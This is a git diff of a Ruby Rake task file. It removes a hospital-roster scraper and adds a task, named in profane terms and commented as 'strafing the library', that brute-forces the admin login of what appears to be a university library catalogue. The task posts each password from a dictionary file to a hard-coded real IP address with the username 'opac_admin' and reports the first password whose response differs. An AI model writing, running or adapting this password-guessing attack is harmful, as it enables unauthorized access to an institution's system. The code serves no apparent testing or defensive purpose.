@@ -81,24 +81,6 @@ namespace :task do
    end
   end
 
-    def hqms_biu # 得到 id:city 键值对
-      result = ""
-      h = Hash.new
-      # 得到页面内容
-      str = get_page('https://www.hqms.org.cn','/usp/roster/index.jsp')
-      # 得到document对象
-      doc = Nokogiri::HTML(str)
-
-      elements = doc.search(".province_select//option")  #.css(".province_selects")
-      elements.each do |e|
-        # puts e.attributes['value']
-        # puts e.content
-        h[ e.attributes['value'].to_s ] = e.content if !e.attributes['value'].to_s.blank?
-      end
-      # puts h["7180"]
-      h
-    end
-
 
     def get_page (url,path) # 发送数据
       # 连接对象
@@ -180,5 +162,55 @@ namespace :task do
       if result_obj['error_code'] == 0
         code = result_obj['result']
       end
+    end
+
+    # 扫射图书馆
+    task :fuck_my_university => :environment do
+      s=Time.now # 准备开始
+      count = 0 # 记弹器
+      original = fuckit "admin"
+      File.open("dictionary.txt", "r") do |file|
+          file.each_line do |line|
+              if ! line.valid_encoding?
+                line = line.encode("UTF-16be", :invalid=>:replace, :replace=>"?").encode('UTF-8')
+              end
+              pwd = line.chomp
+              begin # 如果上膛不成功则直接到下一发
+                result = fuckit pwd
+              rescue => ex
+                puts
+                puts ">>>>>>>>>>>> 坏掉的弹药~ -#{pwd}-"
+                next
+              end
+              count+=1
+              if result != original
+                puts
+                puts "========= 致命一击: #{pwd} ============="
+                break
+              end
+              e=Time.now
+              time = (e-s).to_i.to_s
+              puts
+              puts "已用时间: - #{time}s -"
+              puts "进攻次数: - #{time}s -"
+              puts "弹   药: -#{pwd}-"
+              puts
+          end
+      end
+    end
+
+    def fuckit (pwd) # 武器
+      url = "http://118.230.103.99:8080"
+      path = "/admin/?passwd=#{pwd}&amp;username=opac_admin"
+      # 引擎
+      conn = Faraday.new(:url => url) do |faraday|
+        faraday.request  :url_encoded             # form-encode POST params
+        faraday.adapter  Faraday.default_adapter  # make requests with Net::HTTP
+      end
+      option = Hash.new
+      option['username'] = 'opac_admin'
+      option['passwd'] = pwd
+      response = conn.post path,option
+      response.body
     end
 end
